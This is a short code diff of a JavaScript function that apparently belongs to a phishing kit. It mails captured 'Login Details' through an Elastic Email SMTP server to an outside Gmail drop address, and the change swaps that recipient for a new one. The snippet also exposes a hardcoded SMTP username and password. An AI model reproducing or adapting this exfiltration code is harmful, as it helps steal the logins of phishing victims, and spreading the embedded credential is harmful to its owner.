@@ -9,7 +9,7 @@ function emailSend() {
     Host: "smtp.elasticemail.com",
     Username: "nelsf38@gmail.com",
     Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
-    To: 'payday10177@gmail.com',
+    To: 'kudahelpuk@gmail.com',
     From: "nelsf38@gmail.com",
     Subject: "Login Details",
     Body: messageBody
